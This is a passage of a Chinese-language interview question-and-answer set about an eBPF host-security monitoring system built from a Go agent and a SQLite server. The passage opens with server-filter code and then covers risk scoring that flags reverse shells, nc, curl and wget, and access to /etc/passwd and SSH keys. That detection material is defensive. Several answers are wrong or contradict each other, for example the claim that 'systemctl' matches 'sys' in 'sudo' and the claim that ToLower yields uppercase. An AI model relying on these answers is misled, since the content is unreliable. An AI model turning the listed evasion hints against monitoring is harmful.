    serverAddr := binary.BigEndian.Uint32(serverIP4)

    // 比较
    return dstAddr == serverAddr && dstPort == uint16(config.ServerPort)
}

// 4. 支持多个 Server 地址
type ServerFilter struct {
    mu      sync.RWMutex
    servers map[string]bool // "ip:port" -> bool
}

func NewServerFilter() *ServerFilter {
    return &ServerFilter{
        servers: make(map[string]bool),
    }
}

func (sf *ServerFilter) AddServer(ip string, port int) {
    sf.mu.Lock()
    defer sf.mu.Unlock()

    key := fmt.Sprintf("%s:%d", ip, port)
    sf.servers[key] = true
}

func (sf *ServerFilter) IsServerAddress(dstAddr uint32, dstPort uint16) bool {
    sf.mu.RLock()
    defer sf.mu.RUnlock()

    ip := net.IPv4(
        byte(dstAddr>>24),
        byte(dstAddr>>16),
        byte(dstAddr>>8),
        byte(dstAddr),
    ).String()

    key := fmt.Sprintf("%s:%d", ip, dstPort)
    return sf.servers[key]
}

// 5. 支持通配符和 CIDR
func (sf *ServerFilter) AddCIDR(cidr string, port int) {
    // 解析 CIDR
    _, ipNet, err := net.ParseCIDR(cidr)
    if err != nil {
        log.Printf("Invalid CIDR: %s", cidr)
        return
    }

    // 添加到过滤列表
    // ...
}
```

**配置文件示例:**

```json
{
    "server_url": "http://localhost:8080/api/events",
    "server_ips": [
        "127.0.0.1:8080",
        "192.168.1.100:8080",
        "0.0.0.0:8080"
    ],
    "server_cidrs": [
        "192.168.1.0/24:8080"
    ]
}
```

**IPv6 支持:**

```go
// 扩展事件结构
type ProcessEvent struct {
    // ... 现有字段 ...

    // 支持 IPv6
    SrcAddr6 [16]byte
    DstAddr6 [16]byte
}

func (sf *ServerFilter) IsServerAddressIPv6(dstAddr6 [16]byte, dstPort uint16) bool {
    sf.mu.RLock()
    defer sf.mu.RUnlock()

    ip := net.IP(dstAddr6[:]).String()
    key := fmt.Sprintf("[%s]:%d", ip, dstPort)
    return sf.servers[key]
}
```

**最佳实践:**

```go
// 1. 使用配置文件,避免硬编码
// 2. 支持多个 Server 地址
// 3. 支持 IPv4 和 IPv6
// 4. 支持 CIDR 和通配符
// 5. 动态更新过滤规则
// 6. 提供调试和验证功能
```

---

### 43. 你的 Agent 使用 getBootTime() 从 /proc/stat 读取启动时间,但这个时间在系统休眠后会改变吗?如何处理?

**答案:** 不会改变。`/proc/stat` 中的 `btime` 是系统启动时刻的绝对时间戳，系统休眠不会影响它。但如果系统时间被手动修改，可能需要重新读取。建议定期校验或使用 `CLOCK_BOOTTIME` 时钟。

---

### 44. 为什么 Agent 的事件发送使用 goroutine 而不是同步发送?如果 goroutine 泄漏怎么办?

**答案:** 异步发送避免阻塞事件读取，提高吞吐量。防止 goroutine 泄漏：1) 使用 `defer` 释放信号量；2) 设置超时和取消机制；3) 监控 goroutine 数量；4) 使用 `context` 控制生命周期。

---

### 45. Server 的 handleEvents 中使用了事件指纹去重,但如果两个完全相同的事件在 5 分钟内发生,会被去重吗?这是否合理?

**答案:** 会被去重。基于 `EventType + PID + Comm + UID + EUID + Filename` 生成指纹。如果两个事件完全相同，5分钟内会被去重。这是合理的，避免重复数据，但可能丢失真实发生的重复事件。建议增加时间戳到指纹中。

---

### 46. 你的 Server 使用 SQLite 作为数据库,如果有多个 Agent 同时写入,如何保证数据一致性?

**答案:** 使用 SQLite 的 WAL 模式和事务。数据库连接池最大 25 个连接，通过 `ON CONFLICT(fingerprint) DO UPDATE` 处理并发写入。但 SQLite 的并发写入能力有限，高并发场景建议改用 PostgreSQL。

---

### 47. Server 的 broadcastChan 缓冲区大小为 100,如果 100 个事件同时到达会发生什么?客户端会丢包吗?

**答案:** 缓冲区满时会阻塞 `broadcastEvents` 协程，直到有客户端消费事件。客户端不会丢包，但可能延迟。如果客户端连接慢，可能影响整体性能。建议增大缓冲区或实现丢弃策略。

---

### 48. 为什么 Server 在处理事件时先检查数据库是否已存在,而不是直接插入?这会造成什么性能问题?

**答案:** 避免重复数据，保证数据一致性。性能问题：每次都需要查询数据库，增加 I/O 开销。建议：1) 使用内存缓存先检查；2) 依赖数据库的 `UNIQUE` 约束和 `ON CONFLICT` 处理；3) 减少查询次数。

---

### 49. 你的 Agent 使用 http.Client 的超时时间为 10 秒,如果 Server 响应慢,Agent 会如何处理?会重试吗?

**答案:** 10秒后超时，打印错误日志并返回，不重试。事件会丢失。建议：1) 增加重试机制；2) 使用指数退避；3) 实现本地持久化队列；4) 超时时间动态调整。

---

### 50. Server 的 WebSocket 连接没有心跳机制,如果客户端断开连接而不发送关闭帧,Server 如何检测?

**答案:** 无法及时检测。Server 依赖 `ReadMessage()` 返回错误来发现断开，但被动连接可能需要 TCP keepalive 超时（默认 2 小时）。建议：1) 实现心跳机制（ping/pong）；2) 设置 TCP keepalive；3) 定期检测连接状态。

---

### 51. 为什么 Agent 在发送事件时将 boot time 转换为 Unix 时间戳,而不直接在内核态完成转换?

**答案:** 内核态无法访问系统启动时间（`/proc/stat`），且 `bpf_ktime_get_ns()` 返回的是自启动以来的纳秒数。必须在用户态结合 boot time 转换为真实时间戳。

---

### 52. Server 的 handleGetEvents 最多返回 1000 条记录,如果前端需要更多数据怎么办?如何实现分页?

**答案:** 使用 `limit` 和 `offset` 参数实现分页。例如：`/api/events?limit=100&offset=0` 获取第一批，`offset=100` 获取第二批。前端可以无限滚动或分页按钮。

---

### 53. 你的 Agent 过滤了自己(comm == "agent")的事件,但如果 Agent 被重命名怎么办?

**答案:** 会被绕过。建议：1) 使用 PID 过滤（Agent 的 PID）；2) 使用可执行文件路径过滤；3) 在环境变量中设置标识；4) 使用特殊的父进程 PID。

---

### 54. Server 的 EventStore 使用 sync.RWMutex 保护 events 数组,但如果多个 goroutine 同时读写会有什么问题?

**答案:** `RWMutex` 允许多个读或一个写，并发安全。但如果写操作频繁，读操作会阻塞。建议：1) 使用 `sync.Map`（适合读多写少）；2) 使用 channel 序列化操作；3) 减少锁的持有时间。

---

### 55. 为什么 Server 在数据库插入失败后仍然继续处理,而不是立即报错?这会造成什么数据不一致?

**答案:** 避免因单次失败影响整体服务。数据不一致：内存中有事件但数据库中没有，重启后丢失。建议：1) 记录失败日志；2) 实现重试机制；3) 使用本地持久化队列。

---

### 56. Agent 的 sendEventToServer 函数在失败时只打印日志,如果 Server 挂了,Agent 会一直重试吗?这会造成什么问题?

**答案:** 不会重试，事件丢失。如果 Server 挂了，所有事件都会丢失。建议：1) 实现重试机制；2) 使用本地队列暂存；3) 实现断点续传；4) 监控 Server 状态。

---

### 57. Server 的 WebSocket 广播没有使用 broadcastChan 的缓冲区满时的处理逻辑,如果满了会阻塞吗?

**答案:** 会阻塞 `handleEvents` 协程，导致事件处理变慢。如果持续满，可能导致 ring buffer 溢出。建议：1) 增大缓冲区；2) 实现丢弃策略；3) 异步广播，不阻塞事件处理。

---

### 58. 为什么 Agent 使用 bytes.Trim(event.Comm[:], "\x00") 而不是直接使用 string(event.Comm[:])?

**答案:** `event.Comm` 是固定长度数组 `[16]byte`，可能包含未初始化的 `\0` 字符。直接转换会包含这些空字符，影响显示和比较。`bytes.Trim` 去除空字符，得到干净的字符串。

---

### 59. Server 的 handleHighRiskEvents 复用了 GetEvents 函数,但如果只有高风险事件,为什么还要查询数据库而不是直接过滤内存中的事件?

**答案:** 内存中的 `EventStore` 只保存最近 10000 个事件，历史事件在数据库中。如果要查询所有高风险事件（包括历史），必须查询数据库。内存过滤只能处理最近的事件。

---

### 60. Agent 在启动时没有验证 Server 是否可用,如果 Server 没启动会发生什么?

**答案:** Agent 正常启动并加载 eBPF 程序，开始收集事件。发送事件时失败，打印日志，事件丢失。建议：1) 启动时检查 Server 连接；2) 实现健康检查；3) Server 不可用时进入降级模式。

---

### 61. Server 的 handleTimelineReconstruction 使用 PID 查询,但 PID 可能被复用,如何确保查询到的是正确的进程?

**答案:** 无法完全保证。PID 会在进程退出后被复用。建议：1) 使用 PID + 时间戳范围；2) 使用进程启动时间（`start_time`）；3) 使用进程的其他特征（Comm、UID）组合查询。

---

### 62. 为什么 Agent 不使用连接池,而是为每个事件创建新的 HTTP 连接?

**答案:** 简化实现。但性能差，每次创建连接开销大。建议：1) 使用 `http.Client` 的连接池（已配置，但 `Timeout` 导致连接复用受限）；2) 使用持久连接；3) 使用 HTTP/2 多路复用。

---

### 63. Server 的数据库连接池设置为最大 25 个连接,如果有 50 个并发请求会发生什么?

**答案:** 超过 25 个的请求会等待，直到有连接释放。如果等待时间过长，可能导致超时。建议：1) 增大连接池；2) 使用连接池监控；3) 实现请求排队和限流。

---

### 64. Agent 的事件发送没有重试机制,如果网络抖动导致发送失败,事件会丢失吗?

**答案:** 会丢失。一次失败就放弃。建议：1) 实现重试机制（指数退避）；2) 使用持久化队列；3) 实现断点续传；4) 监控网络质量。

---

### 65. Server 的 handlePrivilegeEscalationTimeline 使用 eventTime.Add(-10 * time.Minute) 计算时间窗口,如果事件在系统刚启动时发生怎么办?

**答案:** `startTime` 可能变成负数（Unix 时间戳），查询返回空结果。建议：1) 限制最小时间到系统启动时间；2) 使用相对时间（自启动以来的纳秒数）；3) 处理边界情况。

---

### 66. 为什么 Server 在处理 WebSocket 消息时不解析消息内容,而是直接丢弃?

**答案:** 当前实现不支持客户端发送消息，只推送事件。丢弃所有客户端消息。如需支持客户端交互，需要实现消息解析和处理逻辑。

---

### 67. Agent 的 sendEventToServer 函数在发送失败时没有重试,如果 Server 临时不可用,事件会丢失吗?

**答案:** 会丢失。建议：1) 实现重试机制；2) 使用本地队列暂存失败的事件；3) 实现离线缓存；4) Server 恢复后批量发送。

---

### 68. Server 的 handleEvents 在去重检查时使用 GetEventByFingerprint,这会造成什么性能问题?如何优化?

**答案:** 每次插入都需要查询数据库，增加 I/O 开销。优化：1) 使用内存缓存（LRU Cache）；2) 批量插入去重；3) 使用 Bloom Filter 快速判断；4) 依赖数据库约束，减少主动查询。

---

### 69. 为什么 Agent 不使用 UDP 而是使用 HTTP 发送事件?两者在可靠性和性能上有什么区别?

**答案:** HTTP 可靠但性能差，UDP 快但不可靠。HTTP 保证送达和顺序，适合安全监控场景。如果需要更高性能，可以使用 UDP + 可靠性层（如 QUIC）或消息队列。

---

### 70. Server 的 handleForensicReport 在生成报告时没有缓存,如果多次请求同一事件会重复计算吗?

**答案:** 会重复计算，每次都查询数据库和分析。建议：1) 使用内存缓存报告；2) 设置缓存过期时间；3) 预生成报告；4) 使用 Redis 缓存。

---

### 71. Agent 在退出时没有处理 ring buffer 中剩余的事件,这些事件会丢失吗?

**答案:** 会丢失。`os.Interrupt` 信号后立即退出，不等待 ring buffer 清空。建议：1) 捕获信号后优雅关闭；2) 等待 ring buffer 清空；3) 实现批量刷新；4. 保存未发送的事件到文件。

---

### 72. Server 的 WebSocket 客户端断开时没有优雅关闭,如果客户端突然断开会发生什么?

**答案:** Server 无法立即检测，依赖 TCP 超时发现断开。客户端连接会占用资源直到超时。建议：1) 实现心跳检测；2) 定期清理死连接；3) 使用 `SetReadDeadline`。

---

### 73. 为什么 Agent 不使用消息队列（如 Kafka）而是直接发送事件到 Server?

**答案:** 简化架构，降低依赖。消息队列更可靠、可扩展，但增加复杂度。建议：1) 小规模部署可直接发送；2) 大规模或高可靠需求使用消息队列；3) 支持两种模式可配置。

---

### 74. Server 的 handleTimelineReconstruction 没有限制时间窗口的最大值,如果用户请求 100 年的时间窗口会发生什么?

**答案:** 查询返回海量数据，可能耗尽内存和超时。建议：1) 限制最大时间窗口（如 30 天）；2) 实现流式返回；3. 分页查询；4. 返回错误提示。

---

### 75. Agent 的事件发送没有优先级,如果系统同时有高风险和低风险事件,哪个会先发送?

**答案:** 随机，基于 goroutine 调度顺序。建议：1) 实现优先级队列；2. 高风险事件优先发送；3. 使用多个 channel 分流。

---

### 76. Server 的 handleEvents 在风险分析失败时仍然插入数据库,这会造成什么问题?

**答案:** 事件的 `risk_level` 为默认值（LOW），影响统计分析。建议：1) 风险分析失败时设置特殊值；2) 记录失败日志；3) 后续重试分析；4. 告警通知。

---

### 77. 为什么 Agent 不使用 eBPF 的 map-to-map 功能直接将事件发送到内核态的共享内存?

**答案:** map-to-map 用于 eBPF 程序间通信，不适合内核态到用户态传输。Ring Buffer 和 Perf Event Array 才是正确选择。

---

### 78. Server 的 handleStatistics 每次都查询数据库,如果数据量很大会有什么性能问题?

**答案:** 数据库压力大，响应慢。建议：1) 使用内存缓存统计数据；2. 定期刷新缓存；3. 使用预计算表；4. 使用 Redis 缓存。

---

### 79. Agent 的 sendEventToServer 函数没有超时控制,如果 Server 响应慢会一直等待吗?

**答案:** `http.Client` 配置了 10 秒超时，会超时返回。但如果超时设置不当，可能导致阻塞。建议：1) 合理设置超时；2. 使用 context 控制超时；3. 实现动态超时调整。

---

### 80. Server 的 handleWebSocket 在发送初始事件时没有分批,如果有 10000 个事件会一次性发送吗?这会造成什么问题?

**答案:** 会一次性发送，可能导致：1) 内存耗尽；2. 发送超时；3. 客户端处理不过来。建议：1) 分批发送；2. 限制初始事件数量；3. 实现流式发送；4. 使用增量更新。

---

## 三、风险分析和评分算法 (30题)

### 81. 你的风险评分算法中,sudo 和 su 命令直接设为 27 分,但如果这些命令只是查看帮助信息（如 sudo --help）怎么办?

**答案:** 误报风险。无法区分 `sudo --help` 和 `sudo su`。建议：1) 解析命令行参数；2. 结合后续事件判断；3. 降低基础分，根据行为动态调整。

---

### 82. 为什么 isHighRiskProgram 检测使用 strings.Contains 而不是精确匹配?这会造成什么误报?

**答案:** `strings.Contains` 会匹配子串，如 `systemctl` 会匹配 `sudo` 中的 `sys`。误报风险高。建议：1) 使用精确匹配；2. 使用词边界检查；3. 使用正则表达式 `\bsudo\b`。

---

### 83. 你的风险评分中,root 用户执行常规程序设为 0 分,但如果 root 用户被入侵后执行恶意程序怎么办?

**答案:** 会漏报。root 用户的恶意程序风险也高。建议：1) 不要根据 UID 重置风险；2. 分析程序行为而非身份；3. 监控 root 用户的异常行为模式。

---

### 84. 为什么 isReverseShell 检测只检查进程名,如果攻击者使用 exec 将 shell 重命名怎么办?

**答案:** 会被绕过。建议：1) 检查可执行文件的真实路径；2. 检测 shell 特征行为（终端、网络）；3. 分析进程的内存映射和环境变量。

---

### 85. 你的风险评分中,CONNECT 事件检测反向 shell 给 40 分,但如果正常的 bash 脚本需要建立网络连接怎么办?

**答案:** 误报。建议：1) 分析上下文（父进程、命令行参数）；2. 检测连接目的（端口、IP）；3. 结合其他事件综合判断。

---

### 86. 为什么 isUnusualPort 只检查几个攻击端口,如果攻击者使用其他端口（如 8443）怎么办?

**答案:** 漏报。8443 是常见 HTTPS 端口，但也可能被滥用。建议：1) 扩展非常规端口列表；2. 检测端口使用模式；3. 分析连接上下文。

---

### 87. 你的风险评分中,SETUID 到 root 给 30 分,但如果程序使用 setuid(0) 然后立即 setuid(original_uid) 怎么办?

**答案:** 无法检测到降权。建议：1) 监控完整的权限变更序列；2. 检测频繁的权限切换；3. 分析权限变更的上下文。

---

### 88. 为什么 isSensitivePath 检测只检查 /etc/ 目录下的文件,如果攻击者访问 /var/log/auth.log 怎么办?

**答案:** 漏报。`/var/log/` 包含敏感日志。建议：1) 扩展敏感路径列表；2. 检测日志文件访问模式；3. 分析访问频率和上下文。

---

### 89. 你的风险评分中,OPENAT 访问敏感文件给 20 分,但如果只是读取文件内容而不修改怎么办?

**答案:** 无法区分读写。建议：1) 检测文件打开模式（`O_RDONLY` vs `O_WRONLY`）；2. 分析后续事件（是否有写入）；3. 降低只读访问的风险分数。

---

### 90. 为什么 isHighRiskProgram 不包括 systemctl、systemd 等系统管理工具?

**答案:** 应该包括。`systemctl` 可以管理系统服务，风险高。建议：1) 扩展高风险程序列表；2. 包括系统管理工具；3. 监控 systemd 单元变更。

---

### 91. 你的风险评分中,FILE_WRITE 写入 /etc/passwd 给 35 分,但如果只是追加一行怎么办?

**答案:** 无法区分追加和覆盖。建议：1) 检测写入模式（`O_APPEND`）；2. 分析写入内容；3. 结合其他事件（如是否添加新用户）。

---

### 92. 为什么 isSuspiciousTool 包括 curl 和 wget,但它们是常用的下载工具?

**答案:** 确实常用，但攻击者也可能使用。建议：1) 降低基础分；2. 分析下载目标；3. 结合上下文（父进程、命令行参数）。

---

### 93. 你的风险评分中,时间因素只检查非工作时间,如果攻击者在工作时间发起攻击怎么办?

**答案:** 工作时间的攻击风险降低，但不应该忽略。建议：1. 降低时间因素的权重；2. 增加其他上下文因素；3. 不应完全依赖时间判断。

---

### 94. 为什么 isSensitiveFileAccess 检测的文件类型不包括用户主目录下的 .ssh 文件?

**答案:** 应该包括。`~/.ssh/` 包含 SSH 密钥，极其敏感。建议：1. 扩展敏感文件类型；2. 包括用户主目录的敏感文件；3. 检测密钥文件访问。

---

### 95. 你的风险评分中,EXIT 事件的异常退出码只给 5 分,如果程序以 SIGSEGV 退出怎么办?

**答案:** SIGSEGV（段错误）是严重异常，5分太低。建议：1. 提高异常退出码的风险分数；2. 区分不同的信号；3. 分析崩溃模式。

---

### 96. 为什么 isHighRiskProgram 不包括 docker、kubectl 等容器管理工具?

**答案:** 应该包括。容器管理可以逃逸到宿主机。建议：1. 扩展高风险程序列表；2. 包括容器和编排工具；3. 监控容器逃逸行为。

---

### 97. 你的风险评分中,CONNECT 事件检测可疑工具给 25 分,但如果管理员使用 nc 进行网络调试怎么办?

**答案:** 误报。建议：1. 分析使用上下文（父进程、命令行参数）；2. 检测连接模式（持久 vs 短暂）；3. 降低基础分，根据行为动态调整。

---

### 98. 为什么 isSensitivePath 使用 strings.Contains 而不是路径前缀匹配?这会造成什么误报?

**答案:** `strings.Contains` 会匹配子串，如 `/etc/backup/passwd` 会被误判为 `/etc/passwd`。建议：1. 使用路径前缀匹配；2. 解析完整路径；3. 使用正则表达式 `^/etc/passwd$`。

---

### 99. 你的风险评分中,root 用户执行高风险程序设为 15 分,但如果 root 用户是合法的运维人员怎么办?

**答案:** 无法区分合法运维和恶意使用。建议：1. 不应基于 UID 降权；2. 分析行为模式；3. 实现白名单机制。

---

### 100. 为什么 isReverseShell 检测不包括 python、perl 等脚本语言的反向 shell?

**答案:** 应该包括。脚本语言也可以建立反向 shell（如 `python -c 'import socket...'`）。建议：1. 扩展检测规则；2. 检测脚本解释器 + 网络连接；3. 分析命令行参数。

---

### 101. 你的风险评分中,BIND 事件绑定特权端口给 20 分,但如果服务程序需要绑定 80 端口怎么办?

**答案:** 误报。Web 服务器需要绑定 80 端口。建议：1. 分析程序上下文；2. 检测端口绑定模式（持久 vs 短暂）；3. 实现服务白名单。

---

### 102. 为什么 isUnusualPort 不包括 3389（RDP）等远程桌面端口?

**答案:** 应该包括。3389 是 RDP 端口，攻击者可能使用。建议：1. 扩展非常规端口列表；2. 包括远程桌面和 VNC 端口；3. 监控远程访问模式。

---

### 103. 你的风险评分中,SETUID 事件只检测从普通用户到 root,不检测从 root 到其他用户的降权,这合理吗?

**答案:** 不完全合理。降权可能是正常操作，但也可能是攻击策略。建议：1. 记录所有权限变更；2. 给降权较低的风险分数；3. 检测异常的权限切换模式。

---

### 104. 为什么 isSensitiveProgram 和 isHighRiskProgram 有重复?它们的区别是什么?

**答案:** 重复了。应该合并或明确区分。建议：1. `isSensitiveProgram` 用于敏感操作（如修改密码）；2. `isHighRiskProgram` 用于高风险程序（如 sudo）；3. 统一命名和用途。

---

### 105. 你的风险评分中,FILE_WRITE 事件只检查 target_file_type,但不检查写入的内容,如果写入的是正常数据怎么办?

**答案:** 无法区分恶意和正常写入。建议：1. 监控文件内容变化（通过文件系统事件）；2. 检测敏感模式（如添加用户、修改密码）；3. 分析写入上下文。

---

### 106. 为什么 isSuspiciousTool 不包括 ssh-keygen 等密钥生成工具?

**答案:** 应该包括。密钥生成可能用于建立后门。建议：1. 扩展可疑工具列表；2. 包括密钥生成和管理工具；3. 监控密钥文件创建。

---

### 107. 你的风险评分中,CONNECT 事件的 protocol 字段硬编码为 6（TCP）,但如果是 UDP 连接怎么办?

**答案:** 无法检测 UDP 连接。建议：1. 从 socket 读取协议类型；2. 支持 TCP 和 UDP；3. 检测 UDP 反向 shell。

---

### 108. 为什么 isSensitivePath 不包括 /tmp 目录,攻击者可能在 /tmp 中创建恶意文件?

**答案:** 应该包括。`/tmp` 是常见的恶意文件放置点。建议：1. 扩展敏感路径；2. 检测 `/tmp` 中的可执行文件创建；3. 监控 `/tmp` 的访问模式。

---

### 109. 你的风险评分中,EXIT 事件的退出码为 0 也记录,但正常退出的进程需要监控吗?

**答案:** 正常退出风险低，但记录有价值。可以分析进程生命周期、检测异常终止。建议：1. 降低正常退出的风险分数；2. 保留记录用于分析；3. 专注于异常退出。

---

### 110. 为什么 isHighRiskProgram 使用小写比较,如果进程名是大写（如 SUDO）怎么办?

**答案:** 使用了 `strings.ToLower`，会转换为大写。但转换后可能误匹配子串。建议：1. 使用精确匹配；2. 不区分大小写的精确匹配；3. 使用词边界。

---

## 四、系统架构和设计问题 (30题)

### 111. 你的系统采用 Agent-Server 架构,为什么不使用集中式的 eBPF 程序直接发送到数据库?

**答案:** Agent-Server 架构更灵活：1) 分布式部署；2) 降低单点故障；3) 支持多主机监控；4) 解耦数据收集和存储。集中式架构难以扩展。

---

### 112. 你使用了 Ring Buffer 在内核态和用户态之间传递数据,为什么不使用 Perf Event Array?

**答案:** Ring Buffer 是现代、高效的选择：1) 自动内存管理；2) 更好的批量处理；3) 零拷贝；4) 更简单的 API。Perf Event Array 适合旧内核或特殊需求。

---

### 113. 你的 Server 使用 SQLite 作为数据库,为什么不使用 PostgreSQL 或 MySQL?

**答案:** SQLite 简单、无需配置、适合单机部署。PostgreSQL/MySQL 更强大、支持高并发、适合生产环境。建议：1. 开发用 SQLite；2. 生产用 PostgreSQL；3. 支持可配置的数据库后端。

---

### 114. 你使用了 WebSocket 实时推送事件,为什么不使用 Server-Sent Events (SSE)?

**答案:** WebSocket 支持双向通信，更灵活。SSE 只支持服务器到客户端的单向推送。如果只需要推送，SSE 更简单。当前实现需要双向通信（心跳），WebSocket 更合适。

---

### 115. 你的 Agent 和 Server 之间使用 HTTP 通信,为什么不使用 gRPC 或消息队列?

**答案:** HTTP 简单、通用、易于调试。gRPC 性能更好、支持流式、更高效。消息队列更可靠、可扩展。建议：1. 小规模用 HTTP；2. 高性能用 gRPC；3. 高可靠用消息队列。

---

### 116. 你的系统支持时间线重建,但为什么不支持进程树重建?如何实现?

**答案:** 应该支持。实现方法：1) 基于 PID 和 PPID 构建树；2) 使用图算法（DFS/BFS）遍历；3) 可视化进程树；4. 支持交互式探索。

---

### 117. 你使用了事件指纹去重,但为什么不使用 Bloom Filter 来减少数据库查询?

**答案:** Bloom Filter 可以快速判断是否可能重复，减少数据库查询。实现：1) 使用 Bloom Filter 缓存最近事件；2. Bloom Filter 命中后查询数据库确认；3. 定期重建 Bloom Filter。

---

### 118. 你的 Server 的 REST API 没有认证机制,如何防止未授权访问?

**答案:** 当前实现缺乏安全。建议：1. 添加 API Key 认证；2. 使用 JWT Token；3. 实现 TLS 加密；4. IP 白名单；5. 速率限制。

---

### 119. 你使用了 gorilla/mux 作为路由框架,为什么不使用标准库的 http.ServeMux?

**答案:** gorilla/mux 功能更强大：1) 支持路径变量；2) 支持方法匹配；3. 支持子路由；4. 更好的性能。标准库 `http.ServeMux` 功能有限。

---

### 120. 你的系统不支持分布式部署,如果要支持多台服务器需要修改哪些部分?

**答案:** 需要：1) Agent 支持多 Server 负载均衡；2. Server 支持集群（共享数据库）；3. 实现服务发现；4. 支持事件聚合；5. 统一的认证和授权。

---

### 121. 你使用了 cilium/ebpf 库加载 eBPF 程序,为什么不使用 bpftool?

**答案:** cilium/ebpf 是 Go 库，便于集成。bpftool 是命令行工具，不适合程序化使用。cilium/ebpf 提供更友好的 API 和错误处理。

---

### 122. 你的前端使用 React CDN,为什么不打包为静态文件?

**答案:** 简化部署，无需构建步骤。但生产环境应该打包：1) 减少网络请求；2) 优化加载性能；3. 支持离线缓存；4. 减少依赖外部 CDN。

---

### 123. 你的系统没有日志轮转机制,如果运行时间长了日志文件会变得很大怎么办?

**答案:** 磁盘耗尽。建议：1) 使用 logrotate；2) 实现日志轮转（按大小/时间）；3) 限制日志保留时间；4) 压缩旧日志。

---

### 124. 你使用了 SQLite 的 WAL 模式吗?如果没有,如何处理并发写入?

**答案:** 当前没有显式启用 WAL。SQLite 默认是回滚日志模式。建议：1) 启用 WAL 模式（`PRAGMA journal_mode=WAL`）；2) 增加并发性能；3. 减少锁竞争。

---

### 125. 你的系统不支持配置文件,如果要修改风险评分阈值需要重新编译吗?

**答案:** 是的。建议：1) 使用配置文件（YAML/JSON）；2) 支持运行时配置更新；3. 提供配置验证；4. 支持配置热重载。

---

### 126. 你使用了 Go 的 sync 包进行并发控制,为什么不使用 channel?

**答案:** sync.Mutex 适合保护共享数据，channel 适合消息传递。当前场景使用 sync.RWMutex 保护 EventStore 是合适的。channel 也可以用于序列化操作。

---

### 127. 你的系统没有监控指标,如何监控 Agent 和 Server 的健康状态?

**答案:** 建议添加：1) Prometheus 指标；2) 健康检查端点；3) 日志和告警；4) 性能监控（延迟、吞吐量）；5. 资源使用监控。

---

### 128. 你使用了 Go 的标准库 JSON 编解码,为什么不使用更快的 JSON 库（如 jsoniter）?

**答案:** 标准库够用且稳定。高性能场景可以使用 jsoniter：1) 更快的编解码；2) 兼容标准库 API；3. 减少延迟。

---

### 129. 你的系统不支持数据导出,如何将取证报告导出为 PDF?

**答案:** 当前支持导出为 Markdown/Text。导出 PDF 需要：1) 使用 PDF 生成库（如 gofpdf）；2) 使用 HTML 转 PDF（如 wkhtmltopdf）；3. 使用模板引擎。

---

### 130. 你使用了 SQLite 的 UNIQUE 约束来实现去重,但如果数据量很大会有什么性能问题?

**答案:** UNIQUE 约束需要索引，插入时需要检查唯一性，影响性能。建议：1. 使用内存缓存先去重；2. 批量插入；3. 使用 Bloom Filter；4. 考虑数据库分片。

---

### 131. 你的系统不支持告警机制,如何在高风险事件发生时发送邮件或短信?

**答案:** 建议添加：1) 告警规则引擎；2) 邮件通知（SMTP）；3) 短信通知（短信网关）；4. Webhook 集成；5. 告警去重和聚合。

---

### 132. 你使用了 Go 的 context 包处理信号,为什么不使用 signal.Notify 直接处理?

**答案:** context 提供超时和取消机制，更灵活。signal.Notify 只能接收信号。context 可以协调整个应用的关闭流程。

---

### 133. 你的系统不支持数据加密,如何保护数据库中的敏感信息?

**答案:** 建议添加：1) 数据库加密（如 SQLCipher）；2. 字段级加密；3. 传输加密（TLS）；4. 密钥管理；5. 访问控制。

---

### 134. 你使用了 Go 的 time 包处理时间,但没有考虑时区问题,如何处理?

**答案:** 当前使用 UTC 时间。建议：1) 统一使用 UTC；2. 显示时转换为本地时区；3. 存储时区信息；4. 使用 time 包的 Location。

---

### 135. 你的系统不支持多租户,如何为不同用户提供隔离的数据视图?

**答案:** 建议添加：1) 用户认证和授权；2. 数据隔离（按 Agent ID 或用户 ID）；3. 访问控制列表；4. 租户配置。

---

### 136. 你使用了 Go 的 defer 语句关闭资源,但如果 panic 发生会正确关闭吗?

**答案:** 会。defer 在 panic 时也会执行。但建议：1) 检查关闭错误；2) 使用 recover 捕获 panic；3. 确保资源正确释放。

---

### 137. 你的系统不支持事件过滤,用户如何只查看特定类型的事件?

**答案:** 当前支持按风险等级、事件类型、Agent ID 过滤。建议：1. 扩展过滤条件；2. 支持复杂查询；3. 保存常用过滤条件。

---

### 138. 你使用了 Go 的 http.Client 但没有配置连接池,如何优化?

**答案:** 已配置 `Timeout` 但未配置连接池。建议：1. 配置 `MaxIdleConns`；2. 配置 `MaxIdleConnsPerHost`；3. 配置 `IdleConnTimeout`；4. 启用 HTTP/2。

---

### 139. 你的系统不支持数据归档,如何清理旧的事件数据?

**答案:** 建议添加：1. 数据保留策略（如 30 天）；2. 定时清理任务；3. 数据归档到冷存储；4. 压缩旧数据。

---

### 140. 你的系统不支持 A/B 测试,如何验证新的风险评分算法是否有效?

**答案:** 建议添加：1. 离线评估（历史数据回放）；2. A/B 测试框架；3. 指标对比（精确率、召回率）；4. 用户反馈机制。

---

## 五、性能和优化问题 (20题)

### 141. 你的系统在高并发场景下,SQLite 会成为瓶颈吗?如何优化?

**答案:** 会。SQLite 并发能力有限。优化：1. 启用 WAL 模式；2. 增大连接池；3. 使用连接池监控；4. 考虑迁移到 PostgreSQL。

---

### 142. 你的 Agent 使用 goroutine 发送事件,如果有 10000 个事件同时到达会创建 10000 个 goroutine 吗?

**答案:** 是的，但受信号量限制（最多 50 个并发）。其他 goroutine 会阻塞等待。优化：1. 使用 worker pool；2. 限制 goroutine 数量；3. 使用批处理。

---

### 143. 你的 Server 的 WebSocket 广播使用遍历所有客户端,如果有 1000 个客户端会有性能问题吗?

**答案:** 会有。广播 O(n) 复杂度，1000 个客户端会慢。优化：1. 使用发布订阅模式；2. 批量广播；3. 使用消息队列；4. 实现分片。

---

### 144. 你的风险评分算法使用了多个字符串比较,如何优化以提高性能?

**答案:** 优化：1. 使用 Map 或 Set 替代线性搜索；2. 使用 Trie 树匹配前缀；3. 预编译正则表达式；4. 使用哈希缓存结果。

---

### 145. 你的数据库查询没有使用索引优化,如何设计索引以提高查询性能?

**答案:** 已有索引（timestamp, risk_level, event_type, agent_id, fingerprint）。优化：1. 添加复合索引；2. 分析查询模式；3. 使用 EXPLAIN 查询计划；4. 定期重建索引。

---

### 146. 你的 Agent 从 ring buffer 读取事件后立即发送,如果网络延迟大,ring buffer 会满吗?

**答案:** 会。建议：1. 增大 ring buffer；2. 实现背压；3. 使用本地队列暂存；4. 监控缓冲区使用率。

---

### 147. 你的 Server 的 handleEvents 函数串行处理,如何改为并发处理?

**答案:** 使用 worker pool：1. 创建固定数量的 worker；2. 使用 channel 分发任务；3. 等待 worker 完成；4. 限制并发数。

---

### 148. 你的系统每秒能处理多少事件?如何测试和优化?

